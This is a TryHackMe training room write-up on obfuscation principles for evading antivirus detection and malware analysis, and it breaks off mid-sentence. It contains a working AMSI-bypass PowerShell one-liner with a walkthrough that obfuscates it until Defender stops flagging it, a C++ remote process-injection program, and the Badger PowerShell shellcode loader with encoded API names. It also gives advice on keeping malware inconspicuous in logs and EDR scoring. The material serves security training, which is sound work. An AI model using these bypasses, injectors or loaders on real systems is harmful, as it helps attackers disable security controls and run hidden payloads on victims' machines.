# [Obfuscation Principles](https://tryhackme.com/r/room/obfuscationprinciples)

![ObfuscationPrinciples](./images/ObfuscationPrinciples.png)

Leverage tool-agnostic software obfuscation practices to hide malicious functions and create unique code.

## Task 1 - Introduction

Obfuscation is an essential component of detection evasion methodology and preventing analysis of malicious software. Obfuscation originated to protect software and intellectual property from being stolen or reproduced. While it is still widely used for its original purpose, adversaries have adapted its use for malicious intent.


In this room, we will observe obfuscation from multiple perspectives and break down obfuscation methods.

![task1-logo](./images/task1-logo.png)

### Learning Objectives

1. Learn how to evade modern detection engineering using tool-agnostic obfuscation
2. Understand the principles of obfuscation and its origins from intellectual property protection
3. Implement obfuscation methods to hide malicious functions

Before beginning this room, familiarize yourself with basic programming logic and syntax. Knowledge of C and PowerShell is recommended but not required.

We have provided several machines with the required files and web servers to complete this room. Using the credentials below, you can access the machine and web server in-browser or through RDP.

|Machine IP: MACHINE_IP|Username: Student|Password: TryHackMe!|

This is going to be a lot of information. Please put on your evil helmets and locate your nearest fire extinguisher.

### Answer the questions below

* Read the above and continue to the next task.


## Task 2 - Origins of Obfuscation

Obfuscation is widely used in many software-related fields to protect IP (Intellectual Property) and other proprietary information an application may contain.

For example, the popular game: Minecraft uses the obfuscator [ProGuard](https://github.com/Guardsquare/proguard) to obfuscate and minimize its Java classes. Minecraft also releases **obfuscation maps** with limited information as a translator between the old un-obfuscated classes and the new obfuscated classes to support the modding community.

This is only one example of the wide range of ways obfuscation is publicly used. To document and organize the variety of obfuscation methods, we can reference the [Layered obfuscation: a taxonomy of software obfuscation techniques for layered security paper](https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf). This research paper organizes obfuscation methods by layers, similar to the OSI model but for application data flow. Below is the figure used as the complete overview of each taxonomy layer.

![task2-layer1](./images/task2-layer1.png)

Each sub-layer is then broken down into specific methods that can achieve the overall objective of the sub-layer.

In this room, we will primarily focus on the **code-element layer** of the taxonomy, as seen in the figure below.

![task2-layer2](./images/task2-layer2.png)

To use the taxonomy, we can determine an objective and then pick a method that fits our requirements. For example, suppose we want to obfuscate the layout of our code but cannot modify the existing code. In that case, we can inject junk code, summarized by the taxonomy:

`Code Element Layer` > `Obfuscating Layout` > `Junk Codes.`

But how could this be used maliciously? Adversaries and malware developers can leverage obfuscation to break signatures or prevent program analysis. In the upcoming tasks, we will discuss both perspectives of malware obfuscation, including the purpose and underlying techniques of each.

### Answer the questions below

* How many core layers make up the Layered Obfuscation Taxonomy?

* What sub-layer of the Layered Obfuscation Taxonomy encompasses meaningless identifiers?

## Task 3 - Obfuscation's Function for Static Evasion

Two of the more considerable security boundaries in the way of an adversary are **anti-virus engines** and **EDR** (Endpoint Detection & Response) solutions. As covered in the [Introduction to Anti-virus room](https://tryhackme.com/room/introtoav), both platforms will leverage an extensive database of known signatures referred to as static signatures as well as heuristic signatures that consider application behavior.

To evade signatures, adversaries can leverage an extensive range of logic and syntax rules to implement obfuscation. This is commonly achieved by abusing data obfuscation practices that hide important identifiable information in legitimate applications.

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element layer**. Below is a table of methods covered by the taxonomy in the **obfuscating data** sub-layer.

![task3-diagram](./images/task3-diagram.png)

|Obfuscation Method|Purpose|
|------------------|-------|
|Array Transformation|Transforms an array by splitting, merging, folding, and flattening|
|Data Encoding|Encodes data with mathematical functions or ciphers|
|Data Procedurization|Substitutes static data with procedure calls|
|Data Splitting/Merging|Distributes information of one variable into several new variables|

In the upcoming tasks, we will primarily focus on data **splitting/merging**; because static signatures are weaker, we generally only need to focus on that one aspect in initial obfuscation.

Check out the Encoding/Packing/Binder/Crypters room for more information about **data encoding**, and the [Signature Evasion room](https://tryhackme.com/room/signatureevasion) for more information about **data procedurization** and **transformation**.

### Answer the questions below

* What obfuscation method will break or split an object?

* What obfuscation method is used to rewrite static data with a procedure call?

## Task 4 - Object Concatenation

**Concatenation** is a common programming concept that combines two separate objects into one object, such as a string.

A pre-defined operator defines where the concatenation will occur to combine two independent objects. Below is a generic example of string concatenation in Python.

```
>>> A = "Hello "
>>> B = "THM"
>>> C = A + B
>>> print(C)
Hello THM
>>>
```

Depending on the language used in a program, there may be different or multiple pre-defined operators than can be used for concatenation. Below is a small table of common languages and their corresponding pre-defined operators.

|Language|Concatenation Operator|
|--------|----------------------|
|Python|“**+**”|
|PowerShell|“**+**”, ”,”, ”**$**”, or no operator at all|
|C#|“**+**”, “**String.Join**”, “**String.Concat**”|
|C|“**strcat**”|
|C++|“**+**”, “**append**”|

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer’s **data splitting/merging** sub-layer.

What does this mean for attackers? Concatenation can open the doors to several vectors to modify signatures or manipulate other aspects of an application. The most common example of concatenation being used in malware is breaking targeted **static signatures**, as covered in the [Signature Evasion room](https://tryhackme.com/room/signatureevasion). Attackers can also use it preemptively to break up all objects of a program and attempt to remove all signatures at once without hunting them down, commonly seen in obfuscators as covered in task 9.

Below we will observe a static **Yara** rule and attempt to use concatenation to evade the static signature.

```
rule ExampleRule
{
    strings:
        $text_string = "AmsiScanBuffer"
        $hex_string = { B8 57 00 07 80 C3 }

    condition:
        $my_text_string or $my_hex_string
}
```

When a compiled binary is scanned with Yara, it will create a positive alert/detection if the defined string is present. Using concatenation, the string can be functionally the same but will appear as two independent strings when scanned, resulting in no alerts.

![task4-arrow](./images/task4-arrow.png)

If the second code block were to be scanned with the Yara rule, there would be no alerts!

Extending from concatenation, attackers can also use **non-interpreted characters** to disrupt or confuse a static signature. These can be used independently or with concatenation, depending on the strength/implementation of the signature. Below is a table of some common non-interpreted characters that we can leverage.

|Character|Purpose|Example|
|---------|-------|-------|
|Breaks|Break a single string into multiple sub strings and combine them|`('co'+'ffe'+'e')`|
|Reorders|Reorder a string’s components|`('{1}{0}'-f'ffee','co')`|
|Whitespace|Include white space that is not interpreted|`.( 'Ne' +'w-Ob' + 'ject')`|
|Ticks|Include ticks that are not interpreted|`d`own`LoAd`Stri`ng`|
|Random Case|Tokens are generally not case sensitive and can be any arbitrary case|`dOwnLoAdsTRing`|

Using the knowledge you have accrued throughout this task, obfuscate the following PowerShell snippet until it evades Defender’s detections.

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

To get you started, we recommend breaking up each section of the code and observe how it interacts or is detected. You can then break the signature present in the independent section and add another section to it until you have a clean snippet.

Once you think your snippet is sufficiently obfuscated, submit it to the webserver at http://MACHINE_IP ; if successful a flag will appear in a pop-up.

If you are still stuck we have provided a walkthrough of the solution below.

### Solution Walkthrough

To begin trying to clean this code snippet we need to break it down and understand where the alerts are originating.
We can break the snippet where each cmdlet is present (GetField, SetValue)

1. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`
2. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')`
3. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`

Let’s execute the first code snippet and see what PowerShell returns.

```
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
At line:1 char:1
+ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Nothing surprising there… we can break this snippet up further by breaking up the .NET assembly and seeing which part results in an alert.

```
PS M:\\> [Ref].Assembly.GetType('System')
PS M:\\> [Ref].Assembly.GetType('System.Management')
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation')
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
At line:1 char:1
+ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

We now know that `AmsiUtils` is contributing directly to the alert. Next, we can target it with concatenation to break it up and attempt to make this section clean.

```
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils')

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
False    False    AmsiUtils                                System.Object
```

Success! Now we can append our next snippet to this clean version of the first snippet and execute it.

```
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsiInitFailed','NonPublic,Static')
At line:1 char:1
+ [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils' ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Now this snippet may be harder to track down…. With some prior knowledge of PowerShell we can assume that `NonPublic` and `Static` are both pretty standard and would not contribute to the signature. We can assume `amsiInitFailed` is what Defender is alerting on and attempt to split it.

```
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic')

Name                   : amsiInitFailed
MetadataToken          : 67114384
[snip]
...
[snip]
IsSecurityTransparent  : False
CustomAttributes       : {}
```

Success! Now we can append our next snippet to this clean version of the first and second snippet and execute it.

```
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').SetValue($null,$true)
At line:1 char:1
+ [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils' ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS M:\\>
```

This is interesting, there doesn’t seem to be any parameter values that would contribute to this alert? This must mean that Defender is alerting on the presence of each cmdlet together to determine it is a malicious snippet. To solve this problem we need to separate the cmdlet(s) from the rest of the snippet. This technique is known as separation of related code and is often seen along with concatenation, we will cover this concept further in task 8.

```
PS M:\\> $Value="SetValue"
PS M:\\> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').$Value($null,$true)
PS M:\\>
```

Success! There are no more alerts so we now have a clean snippet that we can use! Submit this clean code snippet to http://MACHINE_IP and obtain the flag.

### Answer the questions below

* What flag is found after uploading a properly obfuscated snippet?

## Task 5 - Obfuscation's Function for Analysis Deception

After obfuscating basic functions of malicious code, it may be able to pass software detections but is still susceptible to human analysis. While not a security boundary without further policies, analysts and reverse engineers can gain deep insight into the functionality of our malicious application and halt operations.

Adversaries can leverage advanced logic and mathematics to create more complex and harder-to-understand code to combat analysis and reverse engineering.

For more information about reverse engineering, check out the [Malware Analysis module](https://tryhackme.com/module/malware-analysis).

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under other sub-layers of the **code-element layer**. Below is a table of methods covered by the taxonomy in the **obfuscating layout** and **obfuscating controls sub-layers**.

![task5-diagram](./images/task5-diagram.png)

|Obfuscation Method|Purpose|
|------------------|-------|
|Junk Code|Add junk instructions that are non-functional, also known as a code stubs|
|Separation of Related Code|Separate related codes or instructions to increase difficulty in reading the program|
|Stripping Redundant Symbols|Strips symbolic information such as debug information or other symbol tables|
|Meaningless Identifiers|Transform a meaningful identifier to something meaningless|
|Implicit Controls|Converts explicit controls instructions to implicit instructions|
|Dispatcher-based Controls|Determines the next block to be executed during the runtime|
|Probabilistic Control Flows|Introduces replications of control flows with the same semantics but different syntax|
|Bogus Control Flows|Control flows deliberately added to a program but will never be executed|

In the upcoming tasks, we will demonstrate several of the above methods in an agnostic format.

Check out the [Sandbox Evasion room](https://tryhackme.com/room/sandboxevasion) for more information about anti-analysis and anti-reversing

### Answer the questions below

* What are junk instructions referred to as in junk code?

* What obfuscation layer aims to confuse an analyst by manipulating the code flow and abstract syntax trees?

## Task 6 - Code Flow and Logic

**Control flow** is a critical component of a program’s execution that will define how a program will logically proceed. **Logic** is one of the most significant determining factors to an application’s control flow and encompasses various uses such as **if/else statements** or **for loops**. A program will traditionally execute from the top-down; when a logic statement is encountered, it will continue execution by following the statement.

Below is a table of some logic statements you may encounter when dealing with control flows or program logic.

|Logic Statement|Purpose|
|---------------|-------|
|if/else|Executes only if a condition is met, else it will execute a different code block|
|try/catch|Will try to execute a code block and catch it if it fails to handle errors.|
|switch case|A switch will follow similar conditional logic to an if statement but checks several different possible conditions with cases before resolving to a break or default|
|for/while loop|A for loop will execute for a set amount of a condition. A while loop will execute until a condition is no longer met.|

To make this concept concrete, we can observe an example function and its corresponding **CFG** (Control Flow Graph) to depict it’s possible control flow paths.

```
x = 10 
if(x > 7):
    print("This executes")
else:
    print("This is ignored")
```

![task6-diagram](./images/task6-diagram.png)

What does this mean for attackers? An analyst can attempt to understand a program’s function through its control flow; while problematic, logic and control flow is almost effortless to manipulate and make arbitrarily confusing. When dealing with control flow, an attacker aims to introduce enough obscure and arbitrary logic to confuse an analyst but not too much to raise further suspicion or potentially be detected by a platform as malicious.

In the upcoming task, we will discuss different control flow patterns an attacker can use to confuse an analyst.

### Answer the questions below

* Can logic change and impact the control flow of a program? (T/F)

## Task 7 - Arbitrary Control Flow Patterns

To craft **arbitrary control flow patterns** we can leverage **maths**, **logic**, and/or other **complex algorithms** to inject a different control flow into a malicious function.

We can leverage **predicates** to craft these complex logic and/or mathematical algorithms. Predicates refer to the decision-making of an input function to return **true** or **false**. Breaking this concept down at a high level, we can think of a predicate similar to the condition an if statement uses to determine if a code block will be executed or not, as seen in the example in the previous task.

Applying this concept to obfuscation, **opaque predicates** are used to control a known output and input. The paper, **Opaque Predicate: Attack and Defense in Obfuscated Binary Code**, states, “An opaque predicate is a predicate whose value is known to the obfuscator but is difficult to deduce. It can be seamlessly applied with other obfuscation methods such as junk code to turn reverse engineering attempts into arduous work.” Opaque predicates fall under the **bogus control flow** and **probabilistic control flow** methods of the taxonomy paper; they can be used to arbitrarily add logic to a program or refactor the control flow of a pre-existing function.

The topic of opaque predicates requires a deeper understanding of mathematics and computing principles, so we will not cover it in-depth, but we will observe one common example.

![task7-diagram](./images/task7-diagram.png)

The **Collatz Conjecture** is a common mathematical problem that can be used as an example of an opaque predicate. It states: If two arithmetic operations are repeated, they will return one from every positive integer. The fact that we know it will always output one for a known input (a positive integer) means it is a viable opaque predicate. For more information about the Collatz conjecture, refer to the [Collatz Problem](https://mathworld.wolfram.com/CollatzProblem.html). Below is an example of the Collatz conjecture applied in Python.

```
x = 0
while(x > 1):
    if(x%2==1):
        x=x*3+1
    else:
        x=x/2
    if(x==1):
        print("hello!") 
```

In the above code snippet, the Collatz conjecture will only perform its mathematical operations if `x > 1`, resulting in `1` or `TRUE`. From the definition of the Collatz problem, it will always return one for a positive integer input, so the statement will always return true if `x` is a positive integer greater than one.

To prove the efficacy of this opaque predicate, we can observe its **CFG** (Control Flow Graph) to the right. If this is what an interpreted function looks like, just imagine what a compiled function may look like to an analyst.

Using the knowledge you have accrued throughout this task, put yourself into the shoes of an analyst and attempt to decode the original function and output of the code snippet below.

If you correctly follow the print statements, it will result in a flag you can submit.

### Challenge Code Snippet

```
x = 3
swVar = 1
a = 112340857612345
b = 1122135047612359087
i = 0
case_1 = ["T","d","4","3","3","3","e","1","g","w","p","y","8","4"]
case_2 = ["1a","H","3a","4a","5a","3","7a","8a","d","10a","11a","12a","!","14a"]
case_3 = ["1b","2b","M","4b","5b","6b","c","8b","9b","3","11b","12b","13b","14b"]
case_4 = ["1c","2c","3c","{","5c","6c","7c","8c","9c","10c","d","12c","13c","14c"]
case_5 = ["1d","2d","3d","4d","D","6d","7d","o","9d","10d","11d","!","13d","14d"]
case_6 = ["1e","2e","3e","4e","5e","6e","7e","8e","9e","10e","11e","12e","13e","}"]

while (x > 1):
    if (x % 2 == 1):
        x = x * 3 + 1
    else:
        x = x / 2
    if (x == 1):
        for y in case_1:
            match swVar:
                case 1:
                    print(case_1[i])
                    a = 2
                    b = 214025
                    swVar = 2
                case 2:
                    print(case_2[i])
                    if (a > 10):
                        swVar = 6
                    else:
                        swVar = 3
                case 3:
                    print(case_3[i])
                    b = b + a
                    if (b < 10):
                        swVar = 5
                    else:
                        swVar = 4
                case 4:
                    print(case_4[i])
                    b -= b
                    swVar = 5
                case 5:
                    print(case_5[i])
                    a += a
                    swVar = 2
                case 6:
                    print(case_5[11])
                    print(case_6[i])
                    break
            i = i + 1 
```

### Answer the questions below

* What flag is found after properly reversing the provided snippet?

## Task 8 - Protecting and Stripping Identifiable Information

Identifiable information can be one of the most critical components an analyst can use to dissect and attempt to understand a malicious program. By limiting the amount of identifiable information (variables, function names, etc.), an analyst has, the better chance an attacker has they won't be able to reconstruct its original function.

At a high level, we should consider three different types of identifiable data: code structure, object names, and file/compilation properties. In this task, we will break down the core concepts of each and a case study of a practical approach to each.

### Object Names

Object names offer some of the most significant insight into a program's functionality and can reveal the exact purpose of a function. An analyst can still deconstruct the purpose of a function from its behavior, but this is much harder if there is no context to the function.

The importance of literal object names may change depending on if the language is **compiled**  or **interpreted**. If an interpreted language such as **Python** or **PowerShell** is used, then all objects matter and must be modified. If a compiled language such as **C** or **C#** is used, only objects appearing in the strings are generally significant. An object may appear in the strings by any function that produces an **IO operation**.

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer’s **meaningless identifiers** method.

Below we will observe two basic examples of replacing meaningful identifiers for both an interpreted and compiled language.

As an example of a compiled language, we can observe a process injector written in C++ that reports its status to the command line.

```
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    string leaked = "This was leaked in the strings";

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    cout << "Handle obtained for" << processHandle;
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    cout << "Buffer Created";
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    cout << "Process written with buffer" << remoteBuffer;
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
    cout << "Closing handle" << processHandle;
    cout << leaked;

    return 0;
}
```

Let’s use strings to see exactly what was leaked when this source code is compiled.

```
C:\>.\strings.exe "\Injector.exe"

Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

!This program cannot be run in DOS mode.
>FU
z';
z';
...
[snip]
...
Y_^[
leaked
shellcode
2_^[]
...
[snip]
...
std::_Adjust_manually_vector_aligned
"invalid argument"
string too long
This was leaked in the strings
Handle obtained for
Buffer Created
Process written with buffer
Closing handle
std::_Allocate_manually_vector_aligned
bad allocation
Stack around the variable '
...
[snip]
...
8@9H9T9X9\\9h9|9
:$:(:D:H:
@1p1
```

Notice that all of the iostream was written to strings, and even the shellcode byte array was leaked. This is a smaller program, so imagine what a fleshed-out and un-obfuscated program would look like!

We can remove comments and replace the meaningful identifiers to resolve this problem.

```
#include "windows.h"

int main(int argc, char* argv[])
{
    unsigned char awoler[] = "";

    HANDLE awerfu;
    HANDLE rwfhbf;
    PVOID iauwef;

    awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
    rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
    CloseHandle(awerfu);

    return 0;
}
```

We should no longer have any identifiable string information, and the program is safe from string analysis.

As an example for an interpreted language we can observe the deprecated [Badger PowerShell loader](https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1) from the [BRC4 Community Kit](https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit).

```
Set-StrictMode -Version 2
[Byte[]] $Ait1m = @(0x3d, 0x50, 0x51, 0x57, 0x50, 0x4e, 0x5f, 0x50, 0x4f, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50)
[Byte[]] $ahv3I = @(0x34, 0x59, 0x38, 0x50, 0x58, 0x5a, 0x5d, 0x64, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50)
[Byte[]] $Moo5y = @(0x38, 0x64, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50, 0x3f, 0x64, 0x5b, 0x50)
[Byte[]] $ooR5o = @(0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x3e, 0x50, 0x4c, 0x57, 0x50, 0x4f, 0x17, 0x0b, 0x2c, 0x59, 0x5e, 0x54, 0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x2c, 0x60, 0x5f, 0x5a, 0x2e, 0x57, 0x4c, 0x5e, 0x5e)
[Byte[]] $Reo5o = @(0x3d, 0x60, 0x59, 0x5f, 0x54, 0x58, 0x50, 0x17, 0x0b, 0x38, 0x4c, 0x59, 0x4c, 0x52, 0x50, 0x4f)
[Byte[]] $Reib3 = @(0x3d, 0x3f, 0x3e, 0x5b, 0x50, 0x4e, 0x54, 0x4c, 0x57, 0x39, 0x4c, 0x58, 0x50, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e)
[Byte[]] $Thah8 = @(0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x39, 0x50, 0x62, 0x3e, 0x57, 0x5a, 0x5f, 0x17, 0x0b, 0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57)
[Byte[]] $ii5Ie = @(0x34, 0x59, 0x61, 0x5a, 0x56, 0x50)
[Byte[]] $KooG5 = @(0x38, 0x54, 0x4e, 0x5d, 0x5a, 0x5e, 0x5a, 0x51, 0x5f, 0x19, 0x42, 0x54, 0x59, 0x1e, 0x1d, 0x19, 0x40, 0x59, 0x5e, 0x4c, 0x51, 0x50, 0x39, 0x4c, 0x5f, 0x54, 0x61, 0x50, 0x38, 0x50, 0x5f, 0x53, 0x5a, 0x4f, 0x5e)
[Byte[]] $io9iH = @(0x32, 0x50, 0x5f, 0x3b, 0x5d, 0x5a, 0x4e, 0x2c, 0x4f, 0x4f, 0x5d, 0x50, 0x5e, 0x5e)
[Byte[]] $Qui5i = @(0x32, 0x50, 0x5f, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50, 0x33, 0x4c, 0x59, 0x4f, 0x57, 0x50)
[Byte[]] $xee2N = @(0x56, 0x50, 0x5d, 0x59, 0x50, 0x57, 0x1e, 0x1d)
[Byte[]] $AD0Pi = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x2c, 0x57, 0x57, 0x5a, 0x4e)
[Byte[]] $ahb3O = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x3b, 0x5d, 0x5a, 0x5f, 0x50, 0x4e, 0x5f)
[Byte[]] $yhe4c = @(0x2E, 0x5D, 0x50, 0x4C, 0x5F, 0x50, 0x3F, 0x53, 0x5D, 0x50, 0x4C, 0x4F)

function Get-Robf ($b3tz) {
    $aisN = [System.Byte[]]::new($b3tz.Count)
    for ($x = 0; $x -lt $aisN.Count; $x++) {
       $aisN[$x] = ($b3tz[$x] + 21)
    }
    return [System.Text.Encoding]::ASCII.GetString($aisN)
}
function Get-PA ($vmod, $vproc) {
    $a = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType((Get-Robf $KooG5))
    return ($a.GetMethod((Get-Robf $io9iH), [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($a.GetMethod((Get-Robf $Qui5i))).Invoke($null, @($vmod)))), $vproc))
}
function Get-TDef {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )
    $vtdef = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName((Get-Robf $Ait1m))), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule((Get-Robf  $ahv3I), $false).DefineType((Get-Robf $Moo5y), (Get-Robf $ooR5o), [System.MulticastDelegate])
    $vtdef.DefineConstructor((Get-Robf $Reib3), [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
    $vtdef.DefineMethod((Get-Robf $ii5Ie), (Get-Robf $Thah8), $var_return_type, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
    return $vtdef.CreateType()
}

[Byte[]]$vopcode = @(BADGER_SHELLCODE)

$vbuf = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $AD0Pi)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))).Invoke([IntPtr]::Zero, $vopcode.Length, 0x3000, 0x04)
[System.Runtime.InteropServices.Marshal]::Copy($vopcode, 0x0, $vbuf, $vopcode.length)
([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $ahb3O)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))).Invoke($vbuf, $vopcode.Length, 0x20, [ref](0)) | Out-Null
([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $yhe4c)), (Get-TDef @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([UInt32])))).Invoke(0, 0, $vbuf, [IntPtr]0, 0, [ref](0)) | Out-Null
```

You may notice that some cmdlets and functions are kept in their original state… why is that? Depending on your objectives, you may want to create an application that can still confuse reverse engineers after detection but may not look immediately suspicious. If a malware developer were to obfuscate all cmdlets and functions, it would raise the entropy in both interpreted and compiled languages resulting in higher EDR alert scores. It could also lead to an interpreted snippet appearing suspicious in logs if it is seemingly random or visibly heavily obfuscated.

### Code Structure

Code structure can be a bothersome problem when dealing with all aspects of malicious code that are often overlooked and not easily identified. If not adequately addressed in both interpreted and compiled languages, it can lead to signatures or easier reverse engineering from an analyst.

As covered in the aforementioned taxonomy paper, **junk code** and **reordering code** are both widely used as additional measures to add complexity to an interpreted program. Because the program is not compiled, an analyst has much greater insight into the program, and if not artificially inflated with complexity, they can focus on the exact malicious functions of an application.

Separation of related code can impact both interpreted and compiled languages and result in hidden signatures that may be hard to identify. A heuristic signature engine may determine whether a program is malicious based on the surrounding functions or API calls. To circumvent these signatures, an attacker can randomize the occurrence of related code to fool the engine into believing it is a safe call or function.

### File & Compilation Properties

More minor aspects of a compiled binary, such as the compilation method, may not seem like a critical component, but they can lead to several advantages to assist an analyst. For example, if a program is compiled as a debug build, an analyst can obtain all the available global variables and other program information.

The compiler will include a symbol file when a program is compiled as a debug build. Symbols commonly aid in debugging a binary image and can contain global and local variables, function names, and entry points. Attackers must be aware of these possible problems to ensure proper compilation practices and that no information is leaked to an analyst.

Luckily for attackers, symbol files are easily removed through the compiler or after compilation. To remove symbols from a compiler like **Visual Studio**, we need to change the compilation target from `Debug` to `Release` or use a lighter-weight compiler like **mingw**.

If we need to remove symbols from a pre-compiled image, we can use the command-line utility: `strip`.

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer’s **stripping redundant symbols** method.

Below is an example of using strip to remove the symbols from a binary compiled in **gcc** with debugging enabled.

